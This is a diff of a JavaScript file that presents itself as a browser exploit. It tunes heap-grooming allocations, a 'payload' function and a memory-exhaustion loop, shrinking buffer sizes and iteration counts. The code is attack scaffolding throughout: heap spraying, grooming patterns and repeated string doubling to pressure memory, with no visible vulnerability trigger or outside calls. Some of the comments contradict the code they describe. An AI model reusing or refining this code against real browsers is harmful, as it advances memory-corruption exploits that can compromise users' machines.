@@ -10,7 +10,7 @@ let a, se_a, c, se_c;
 function initializeHeap() {
     //alert("Int heap");
     let buffers = [];
-    for (let i = 0; i < 2048; i++) { // Reduced allocations
+    for (let i = 0; i < 1024; i++) { // Reduced allocations
         buffers.push(new ArrayBuffer(500000)); // Smaller blocks of memory
     }
     return buffers;
@@ -23,7 +23,7 @@ function groomHeap() {
 
     // Allocate and deallocate in patterns
     for (let i = 0; i < 2048; i++) { // Reduced iterations
-        let buffer = new ArrayBuffer(1000000); // Allocate smaller blocks
+        let buffer = new ArrayBuffer(10000); // Allocate smaller blocks
         tempArray.push(buffer);
     }
 
@@ -65,28 +65,25 @@ alert("a")
 
 // Step 4: The Exploit Payload Function
 function payload() {
-    let largeString = "B".repeat(100000); // Smaller initial string
+    let largeString = "B".repeat(10000); // Smaller initial string
     let nestedArray = [];
     let obj = {};
     let iterationCount = 0; // Counter to track number of iterations
 
     while (true) {
         // String concatenation
+      
         largeString += largeString;
-        if (largeString.length > 10000000) { // Lower threshold for reset
-            largeString = "B".repeat(100000); // Reset string to avoid overflow
+        if (largeString.length > 100000) { // Lower threshold for reset
+            largeString = "B".repeat(10000); // Reset string to avoid overflow
             //memExh();
         }
 memExh();
-        
-        // Nested arrays
-        nestedArray.push([]);
-        if (nestedArray.length > 500) { // Reduced nesting
-            nestedArray = []; // Clear nested arrays to exhaust memory
-        }
 
         iterationCount++;
-        if (iterationCount > 50) break; // Limit iterations to avoid endless loop
+        if (iterationCount > 50) {
+            break; // Limit iterations to avoid endless loop
+        }
     }
 }
 
